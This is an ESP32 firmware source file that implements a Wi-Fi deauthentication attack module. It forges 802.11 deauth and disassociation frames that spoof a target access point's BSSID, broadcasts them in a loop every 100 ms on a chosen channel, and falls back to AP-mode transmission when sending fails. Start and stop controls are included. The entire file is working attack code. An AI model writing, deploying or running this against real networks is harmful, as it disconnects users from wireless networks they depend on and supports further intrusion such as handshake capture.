#include "attack_deauth.h"
#include "wifi_controller.h"
#include <stdio.h>
#include <string.h>
#include "freertos/FreeRTOS.h"
#include "freertos/task.h"
#include "esp_log.h"
#include "esp_wifi.h"

static const char *TAG = "DEAUTH_ATTACK";

static bool attack_active = false;
static TaskHandle_t deauth_task_handle = NULL;
static uint8_t target_bssid[6];
static char target_str[18] = {0};
static bool tx_error_logged = false;
static uint16_t seq_ctrl = 0;

/* Deauth: FC=0xC0, reason=2 (Previous authentication no longer valid) */
static const uint8_t deauth_template[] = {
    0xC0, 0x00, 0x3A, 0x01,
    0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, /* DA broadcast */
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, /* SA = AP BSSID */
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, /* BSSID */
    0xF0, 0xFF,                          /* Sequence Control (variable) */
    0x02, 0x00                           /* Reason Code */
};

/* Disassoc: FC=0xA0 */
static const uint8_t disassoc_template[] = {
    0xA0, 0x00, 0x3A, 0x01,
    0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0xF0, 0xFF,                          /* Sequence Control (variable) */
    0x01, 0x00                           /* Reason Code */
};

static esp_err_t send_mgmt_frame(const uint8_t *template_frame, size_t len) {
    uint8_t frame[26];
    if (len > sizeof(frame)) {
        return ESP_ERR_INVALID_SIZE;
    }
    memcpy(frame, template_frame, len);
    memcpy(&frame[10], target_bssid, 6);
    memcpy(&frame[16], target_bssid, 6);
    
    /* Update sequence control (bytes 22-23) with incremented counter */
    /* Sequence control: fragment number (4 bits) + sequence number (12 bits) */
    seq_ctrl = (seq_ctrl + 16) & 0xFFF0;  /* Increment by 1 in 12-bit field */
    frame[22] = (seq_ctrl & 0xFF);
    frame[23] = ((seq_ctrl >> 8) & 0x0F) | 0xF0;  /* Keep upper 4 bits for fragment */

    esp_err_t ret = esp_wifi_80211_tx(WIFI_IF_STA, frame, len, false);
    if (ret != ESP_OK) {
        if (!tx_error_logged) {
            ESP_LOGE(TAG, "STA TX failed: %s. Trying AP mode...", esp_err_to_name(ret));
        }
        /* Try AP mode as fallback */
        ret = esp_wifi_80211_tx(WIFI_IF_AP, frame, len, false);
        if (ret != ESP_OK && !tx_error_logged) {
            ESP_LOGE(TAG, "AP TX also failed: %s", esp_err_to_name(ret));
            tx_error_logged = true;
        }
    } else {
        tx_error_logged = false;
    }
    return ret;
}

static void deauth_task(void *pvParameters) {
    tx_error_logged = false;
    uint32_t tx_success_count = 0;
    uint32_t tx_fail_count = 0;

    ESP_LOGI(TAG, "Deauth task started, sending frames every 100ms");

    while (attack_active) {
        esp_err_t ret1 = send_mgmt_frame(deauth_template, sizeof(deauth_template));
        esp_err_t ret2 = send_mgmt_frame(disassoc_template, sizeof(disassoc_template));

        if (ret1 == ESP_OK || ret2 == ESP_OK) {
            tx_success_count++;
        } else {
            tx_fail_count++;
            if (!tx_error_logged) {
                ESP_LOGW(TAG, "All frame sends failed - may need WiFi reconfiguration");
                tx_error_logged = true;
            }
        }

        vTaskDelay(pdMS_TO_TICKS(100));
    }
    
    ESP_LOGI(TAG, "Deauth task stopped. Sent: %lu, Failed: %lu", tx_success_count, tx_fail_count);
    deauth_task_handle = NULL;
    vTaskDelete(NULL);
}

void deauth_attack_init(void) {
    ESP_LOGI(TAG, "Deauth attack module initialized");
}

void start_deauth_attack(const uint8_t *bssid, int channel) {
    if (!bssid) {
        ESP_LOGW(TAG, "Invalid BSSID pointer");
        return;
    }

    if (attack_active) {
        stop_deauth_attack();
        vTaskDelay(pdMS_TO_TICKS(500));
    }

    memcpy(target_bssid, bssid, 6);
    snprintf(target_str, sizeof(target_str), MACSTR, MAC2STR(bssid));
    
    if (channel < 1 || channel > 14) {
        ESP_LOGW(TAG, "Invalid channel %d", channel);
        return;
    }
    
    /* Check WiFi mode */
    wifi_mode_t mode;
    esp_wifi_get_mode(&mode);
    ESP_LOGI(TAG, "Current WiFi mode: %d", mode);
    
    if (mode != WIFI_MODE_APSTA && mode != WIFI_MODE_STA) {
        ESP_LOGW(TAG, "WiFi not in STA/APSTA mode, attempting to set...");
        esp_wifi_set_mode(WIFI_MODE_APSTA);
        vTaskDelay(pdMS_TO_TICKS(500));
    }
    
    /* Set channel */
    esp_err_t ret = esp_wifi_set_channel((uint8_t)channel, WIFI_SECOND_CHAN_NONE);
    if (ret != ESP_OK) {
        ESP_LOGE(TAG, "Failed to set channel: %s", esp_err_to_name(ret));
        return;
    }
    
    vTaskDelay(pdMS_TO_TICKS(100));
    
    /* Reset sequence control counter */
    seq_ctrl = 0;
    tx_error_logged = false;
    attack_active = true;
    
    if (xTaskCreate(deauth_task, "deauth_task", 4096, NULL, 5, &deauth_task_handle) != pdPASS) {
        attack_active = false;
        deauth_task_handle = NULL;
        ESP_LOGE(TAG, "Failed to start deauth task");
        return;
    }
    
    ESP_LOGI(TAG, "✅ Started deauth on " MACSTR " ch %d", MAC2STR(bssid), channel);
}

void stop_deauth_attack(void) {
    if (!attack_active) {
        return;
    }
    
    ESP_LOGI(TAG, "Stopping deauth attack...");
    attack_active = false;
    
    /* Wait for task to finish with timeout */
    for (int i = 0; i < 100 && deauth_task_handle != NULL; i++) {
        vTaskDelay(pdMS_TO_TICKS(50));
    }
    
    if (deauth_task_handle != NULL) {
        ESP_LOGW(TAG, "Deauth task did not stop gracefully, forcing delete");
        vTaskDelete(deauth_task_handle);
        deauth_task_handle = NULL;
    }
    
    ESP_LOGI(TAG, "✅ Stopped deauth attack");
}

bool is_attack_active(void) {
    return attack_active;
}

void get_attack_target(char *buffer) {
    if (buffer) {
        strncpy(buffer, target_str, 17);
        buffer[17] = '\0';
    }
}
